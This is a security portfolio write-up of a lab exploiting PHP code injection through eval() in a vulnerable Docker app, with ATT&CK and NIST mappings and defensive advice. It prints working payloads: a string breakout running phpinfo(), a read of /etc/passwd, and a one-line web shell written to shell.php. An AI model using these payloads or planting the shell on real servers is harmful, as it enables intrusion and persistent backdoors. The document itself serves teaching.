# 💻 Code Injection Vulnerabilities – Web Security Portfolio

## 📘 Overview
This lab explores **code injection vulnerabilities** in web applications—a critical class of security flaws that allow attackers to execute arbitrary code on a server. Code injection occurs when untrusted user input is dynamically evaluated as executable code without proper validation or sanitization.

Through a guided, hands-on lab, this exercise demonstrates how insecure coding practices (such as dynamic evaluation of user input) can lead to **server-side code execution**, sensitive file disclosure, and the ability to write malicious files to the system.

The focus of this lab is **understanding risk and attacker behavior**, not exploit development for real-world misuse.

---

## 🎯 Learning Objectives
- Understand what code injection vulnerabilities are
- Identify insecure use of dynamic code execution
- Exploit code injection to execute arbitrary server-side code
- Read sensitive system files through injected code
- Write files to the server via code injection
- Map attacker behavior to **MITRE ATT&CK** and **NIST CSF**

---

## 🧠 Key Concepts Demonstrated
- Unsafe dynamic code execution
- Abuse of server-side evaluation functions
- Input manipulation to alter program flow
- File read and write through injected code
- Escalation from application logic to system impact

---

## 🛠️ Tools & Environment
- Docker (isolated vulnerable environment)
- PHP-based vulnerable web application
- Web browser
- Basic Linux system utilities

---

## 🔍 Step Summery

### 1️⃣ Insecure Dynamic Code Execution
```php
$str = "echo \"Hello ".$_GET['name']."!!!\";";
eval($str);
```
User-controlled input is concatenated into a string that is executed dynamically, enabling code injection when input is not restricted.

### 2️⃣ Vulnerable Application Deployment
```bash
docker run -d -p 82:80 --name code-injection-lab \
jewel591/vulnbox:pentesterlab-WebforPentest-1
```
A deliberately vulnerable PHP application was deployed in a controlled Docker environment for safe testing.

### 3️⃣ Arbitrary Code Execution via Injection
```bash
"; phpinfo(); //
```
Injected input breaks out of the original string and introduces executable PHP code, confirming successful server-side code execution.

### 4️⃣ Sensitive File Disclosure
```bash
var_dump(file_get_contents('/etc/passwd'));
```
Injected code reads sensitive system files, demonstrating the impact of unrestricted file access through code injection.

### 5️⃣ Writing Files to the Server
```bash
file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
```
Injected code creates a server-side script capable of executing system commands, illustrating escalation from code execution to persistent access.

### 6️⃣ Command Execution Validation
```bash
uname -a
```
Execution of system commands via the injected script confirms full control over application-level execution.

## 🧬 MITRE ATT&CK Mapping

| Tactic            | Technique ID | Technique Name                    | Description                                   |
| ----------------- | ------------ | --------------------------------- | --------------------------------------------- |
| Initial Access    | T1190        | Exploit Public-Facing Application | Code injection through vulnerable web input   |
| Execution         | T1059        | Command and Scripting Interpreter | Execution of injected PHP and system commands |
| Credential Access | T1552.001    | Credentials in Files              | Reading sensitive system files                |
| Persistence       | T1505.003    | Web Shell                         | Writing server-side executable files          |
| Discovery         | T1082        | System Information Discovery      | Extracting OS and environment details         |
| Defense Evasion   | T1027        | Obfuscated Files or Information   | Using comments to bypass execution flow       |


## 🧩 NIST Cybersecurity Framework (CSF) Mapping
| NIST Function | Category | Subcategory                    | Description                                            |
| ------------- | -------- | ------------------------------ | ------------------------------------------------------ |
| Identify      | ID.RA    | Risk Assessment                | Identification of unsafe dynamic code execution        |
| Protect       | PR.AC    | Access Control                 | Lack of input validation and execution control         |
| Protect       | PR.DS    | Data Security                  | Exposure of sensitive system files                     |
| Detect        | DE.CM    | Security Continuous Monitoring | Missing detection of abnormal code execution           |
| Respond       | RS.AN    | Analysis                       | Analysis of injected code behavior                     |
| Recover       | RC.IM    | Improvements                   | Eliminating unsafe evaluation and enforcing validation |


## 🔐 Security Impact
This lab demonstrates how code injection vulnerabilities can:
Enable full server-side code execution


Expose sensitive configuration and system files


Allow attackers to write persistent backdoors


Collapse trust boundaries between user input and application logic


Small coding mistakes can result in complete application compromise.

## 🛡️ Defensive Recommendations
Never use dynamic code evaluation on user input


Avoid functions that interpret strings as executable code


Enforce strict input validation and allowlists


Apply least-privilege permissions to application directories


Monitor file creation and execution behavior


Conduct regular secure code reviews



## 📌 Key Takeaway
Code injection vulnerabilities represent one of the most dangerous web application flaws because they directly convert user input into executable logic.
Secure coding practices, strict validation, and avoidance of dynamic execution functions are essential to preventing catastrophic server compromise.

